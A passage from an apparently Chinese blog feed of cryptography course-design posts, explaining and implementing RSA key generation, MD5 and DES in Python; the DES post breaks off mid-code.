class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i== <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始选择p q</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_prime</span><span class="params">(half_len)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; half_len)<span class="comment">#求2^half_len之间的大数</span></span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="comment"># 随机性测试</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):   <span class="comment">#5的时候错误率已经小于千分之一</span></span><br><span class="line">                <span class="keyword">if</span> prime_test(n) == <span class="keyword">False</span>:</span><br><span class="line">                    found = <span class="keyword">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found == <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        测试n是否为素数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        q = n - <span class="number">1</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 寻找k,q 是否满足2^k*q =n - 1</span></span><br><span class="line">        <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            q = q // <span class="number">2</span></span><br><span class="line">        a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 如果 a^q mod n= 1, n 可能是一个素数</span></span><br><span class="line">        <span class="keyword">if</span> fast_mod(a, q, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># 如果存在j满足 a ^ ((2 ^ j) * q) mod n == n-1, n 可能是一个素数</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, k):</span><br><span class="line">            <span class="keyword">if</span> fast_mod(a, (<span class="number">2</span> ** j) * q, n) == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># n 不是素数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>因为是固定好公钥e=65537的，所以下一步的关键就是要实现通过扩展欧几里得算法去求出私钥d，这里面的关键代码如下，先是求出phi(n)然后就通过扩展欧几里得算法求出私钥d，然扩展欧几里的算法使用了递归的方法去实现，但是产生的私钥d有可能是一个负数，你得对其进行处理，最后产生一个大于零的私钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span><span class="params">(key_len)</span>:</span> <span class="comment">#key_len要比消息长度大</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成n, e, d</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    p = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    q = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    n  = p * q</span><br><span class="line">    ph_n = (p <span class="number">-1</span>) * (q <span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"ph_n:"</span>+str(ph_n))</span><br><span class="line">    e = <span class="number">65537</span> <span class="comment">#e取固定值</span></span><br><span class="line">    d = generate_d(ph_n, e)</span><br><span class="line">    <span class="keyword">return</span> (n ,e, d)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">ext_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_gcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">        </span><br><span class="line">   <span class="comment">#产生秘钥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_d</span><span class="params">(ph_n, e)</span>:</span></span><br><span class="line">    (x, y, r) = ext_gcd(ph_n, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#return y % ph_n</span></span><br><span class="line">        <span class="keyword">return</span> y + ph_n  <span class="comment">#直接用加法效率高一丢丢</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>在执行运算的时候使用了一个快速幂的方法，这个方法可以将数值大一点的数简化其模幂运算的过程，代码如下，当然这样的过程也可以使用python里面的pow函数去实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_mod</span><span class="params">(b, n, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    快速幂</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    tmp = b</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">            ret = ret * tmp % m</span><br><span class="line">        tmp = tmp * tmp % m</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>以”helloworldaaa”为例能够正确加解密并且输出加解密的公钥以及私钥。</p><p><a href="https://imgchr.com/i/F5RHAO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F5RHAO.png" alt="F5RHAO.png"></a></p><h3 id="详细代码-放在github上了-：RSA加解密"><a href="#详细代码-放在github上了-：RSA加解密" class="headerlink" title="详细代码(放在github上了)：RSA加解密"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">RSA加解密</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RSA是第一个安全，实用的公钥加密算法，已成为国家标准，是目前应用广泛的公钥加密体制，RSA的基础是数论的欧拉定理
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>MD5原理及Python实现</title>
    <link href="0verwatch.top/MD5-python.html"/>
    <id>0verwatch.top/MD5-python.html</id>
    <published>2019-01-12T08:32:37.000Z</published>
    <updated>2019-01-12T08:33:25.484Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>MD5消息摘要算法一种被广泛使用的密码散列函数，输入长度小于2^64比特的消息，我的代码也是以小于2^64比特的消息为例，输出一个128位（16字节）的散列值<a id="more"></a>（hash value），输入信息以512比特的分组为单位处理。</p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>附加位填充</li><li>初始化链接变量</li><li>分组处理</li><li>步函数的运算</li></ol><p>这个流程描述下来非常符合hash函数的一般模型：</p><p><img src="https://s1.ax1x.com/2018/12/25/FgKNgH.png" alt="FgKNgH.png"></p><p>单个点拿出来仔细分析</p><h4 id="附加位填充"><a href="#附加位填充" class="headerlink" title="附加位填充"></a>附加位填充</h4><p>填充一个1和若干个0使消息长度模512与448同余，也就说剩余消息(此处的消息长度已经不满512位了)的最后512比特分组里面加上这一对填充的东西长度应该是448，还剩下64位是消息的长度，满足L mod 2^64,下图就很清楚解释了这一过程：</p><p><img src="https://s1.ax1x.com/2018/12/25/Fgu4hD.png" alt="Fgu4hD.png"></p><p>关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">length = struct.pack(<span class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#原消息长度64位比特的添加格式，太骚额这种写法</span></span><br><span class="line">   <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">       solve(message[:<span class="number">64</span>])</span><br><span class="line">       message = message[<span class="number">64</span>:]</span><br><span class="line">   <span class="comment">#长度不足64位消息自行填充</span></span><br><span class="line">   message += <span class="string">'\x80'</span></span><br><span class="line">   message += <span class="string">'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">   <span class="comment">#print type(length)</span></span><br><span class="line">   message += length</span><br><span class="line">   solve(message[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><h4 id="初始化链接变量"><a href="#初始化链接变量" class="headerlink" title="初始化链接变量"></a>初始化链接变量</h4><p>使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意，书本上的值是直接给你的，但是没有倒过来，也就是大端和小端的转换问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始向量</span></span><br><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line"><span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br></pre></td></tr></table></figure><h4 id="分组处理"><a href="#分组处理" class="headerlink" title="分组处理"></a>分组处理</h4><p>与分组密码分组处理相似，有4轮步骤，将512比特的消息分组平均分为16个子分组，每个子分组有32比特，参与每一轮的的16步运算，每步输入是4个32比特的链接变量和一个32位的的消息子分组，经过这样的64步之后得到4个寄存器的值分别与输入的链接变量进行模加，关键代码如下，为了能够保存一下一开始A，B，C，D这四个初始变量的值，所以就先找四个变量把他们的值暂存一下，为最后一步的模加做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#分成16个组，I代表1组32位,tql,学到了</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64轮运算</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#每一轮运算只用到了b,c,d三个</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#用于标识处于第几组信息</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffff为了类型转换</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">        <span class="comment">#print(hex(a).replace("0x","").replace("L",""), hex(b).replace("0x","").replace("L","") , hex(c).replace("0x","").replace("L",""), hex(d).replace("0x","").replace("L",""))</span></span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>这上面的代码也包含了第四步的步函数，可以单独把他们提取出来，而不同轮使用的步函数使用的非线性函数是不一样的。即四轮使用四个不同的非线性函数，其实可以发现每个非线性函数的输入不需要A寄存器里面的值，我们只需要B，C，D寄存器里面的东西，这里面得出来的结果分别放进A，C，D寄存器，所以一开始才要找另外的寄存器去存储本身的值，不然的话在转化过程中本身的变量会丢失。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">f = (b ^ c ^ d)</span><br><span class="line">f = c ^(b |(~d))</span><br></pre></td></tr></table></figure><p>A寄存器里面的值的运算有另外自己的一套模式，先用B，C，D向量里面做一次非线性的运算，然后将得出来的结果依次加上第一个变量，32比特的消息和一个伪随机数常数，再将结果循环左移指定的位数，并加上B的值，最后把得出来的结果放进B寄存器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#循环左移的位移位数</span></span><br><span class="line">r = [   <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">        ]</span><br><span class="line">lrot = <span class="keyword">lambda</span> x,n: (x &lt;&lt; n)|(x &gt;&gt; <span class="number">32</span>- n)</span><br><span class="line"><span class="comment">#使用正弦函数产生的位随机数，也就是书本上的T[i]</span></span><br><span class="line">k =  [int(math.floor(abs(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line">tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i])</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>以”helloworld”为例，分别将其在代码中运行，以及线上工具运行，检查它们的一致性。</p><p><a href="https://imgchr.com/i/F52mzn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52mzn.png" alt="F52mzn.png"></a></p><p><a href="https://imgchr.com/i/F52AIg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52AIg.png" alt="F52AIg.png"></a></p><h3 id="详细代码-放在github上了-：MD5实现"><a href="#详细代码-放在github上了-：MD5实现" class="headerlink" title="详细代码(放在github上了)：MD5实现"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">MD5实现</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;MD5消息摘要算法一种被广泛使用的密码散列函数，输入长度小于2^64比特的消息，我的代码也是以小于2^64比特的消息为例，输出一个128位（16字节）的散列值
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>DES原理及Python实现</title>
    <link href="0verwatch.top/DES-python.html"/>
    <id>0verwatch.top/DES-python.html</id>
    <published>2019-01-12T08:21:38.000Z</published>
    <updated>2019-01-12T08:22:50.813Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>DES是分组密码的一类，是一种对称密码技术，使用了Feistel的网络结构<a id="more"></a>，将明文分成多个等长模块，使用确定的算法以及对称并且相同的密钥对明密文进行加解密。</p><p><img src="https://s2.ax1x.com/2019/01/01/F5u1LF.png" alt="F5u1LF.png"></p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>64位的明文经过初始置换而被重新排列，并将其分为左右两个分组L0和R0各32位。</li><li>在密钥的参与下，最左右两个分组进行16轮相同函数的迭代，每轮迭代都有置换和代换。注意最后一轮迭代的输出为64位。左半部分和右半部分不进行交换。</li><li>最后的预输出再通过逆初始置换产生64位的密文。</li><li>加解密过程一样，反过来即可，也就是秘钥列表得倒过来。所以得注意一下。</li></ol><h3 id="核心代码及算法分析"><a href="#核心代码及算法分析" class="headerlink" title="核心代码及算法分析"></a>核心代码及算法分析</h3><p>第一部经过分是明文经过IP置换的操作，这里可以直接用一维数组去完成，这需要注意的是数组下标不要写错，会导致数组越界，最后一部分IP逆的那一部分也一样的道理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]     <span class="comment">#数组下标i-1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#IP逆盒处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_re_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_re_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>再下来就是经过16轮迭代的过程，每一步的迭代过程里面又包含了F函数，还有密钥的产生。</p><p>首先是一个大致的迭代过程，很清楚首先产生了16轮迭代的秘钥，每一轮的迭代都有密钥参与，并且通过切片完成了每一轮的左右分组，然后右边的分组作为了新的左边，左边的分组以及右边的分组还有密钥通过F函数的计算获得新的右分组，最后一轮不做交换，这也就是我为什么只循环了15轮。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt_one</span><span class="params">(bin_message,bin_key)</span>:</span> <span class="comment">#64位二进制加密的测试</span></span><br><span class="line">    <span class="comment">#bin_message = deal_mess(str2bin(message))</span></span><br><span class="line">    mes_ip_bin = ip_change(bin_message)</span><br><span class="line">    <span class="comment">#bin_key = input_key_judge(str2bin(key))</span></span><br><span class="line">    key_lst = gen_key(bin_key)</span><br><span class="line">    mes_left = mes_ip_bin[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    mes_right = mes_ip_bin[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        f_result = fun_f(mes_tmp,key_lst[i])</span><br><span class="line">        mes_right = str_xor(f_result,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    f_result = fun_f(mes_right,key_lst[<span class="number">15</span>])</span><br><span class="line">    mes_fin_left = str_xor(mes_left,f_result)</span><br><span class="line">    mes_fin_right = mes_right</span><br><span class="line">    fin_message = ip_re_change(mes_fin_left + mes_fin_right)</span><br><span class="line">    <span class="keyword">return</span> fin_message</span><br></pre></td></tr></table></figure><p>再看看产生密钥的关键代码gen_key，传进去的参数密钥实际是64位的，但实际发挥作用的是56位，是因为仅过了一次PC-1的置换，这也解释了这段代码为什么到后面切片的时候以28为中心分左右。然后根据是第几轮然后对左右分组的密钥进行循环左移，出来的56位再经过一次置换生成48位的密钥，最后用数组将所有密钥都装好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    divide_output = change_key1(key)</span><br><span class="line">    key_C0 = divide_output[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_D0 = divide_output[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> SHIFT:</span><br><span class="line">        key_c = left_turn(key_C0,i)</span><br><span class="line">        key_d = left_turn(key_D0,i)</span><br><span class="line">        key_output = change_key2(key_c + key_d)</span><br><span class="line">        key_list.append(key_output)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br></pre></td></tr></table></figure><p>PC-1，PC-2的置换过程，跟IP置换差不多，都是利用了打表然后字符串拼接的方式实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#秘钥的PC-1置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key1</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_1:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#秘钥的PC-2置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key2</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res  = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_2:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>重点还有F函数的处理，也即是代码里面的fun_f，这里面主要有四个步骤，分别是扩展置换，密钥加，经过S盒的代换，最后经过了P盒的置换，最终把32位的输入变成48位的输出。E盒以及P盒的置换也是很简单打好表然后用字符串拼接就好。关键是S盒的变换原理，6位的输入4位的输出，输入前两位作为S盒横坐标，中间4位作为列，但是我这里是以bin输出得注意位数不够四位得补齐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># F函数的实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_f</span><span class="params">(bin_str,key)</span>:</span></span><br><span class="line">    first_output = e_key(bin_str)</span><br><span class="line">    second_output = str_xor(first_output,key)</span><br><span class="line">    third_output = s_box(second_output)</span><br><span class="line">    last_output = p_box(third_output)</span><br><span class="line">    <span class="keyword">return</span> last_output</span><br><span class="line"></span><br><span class="line"><span class="comment">#E盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_key</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> E:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line"> 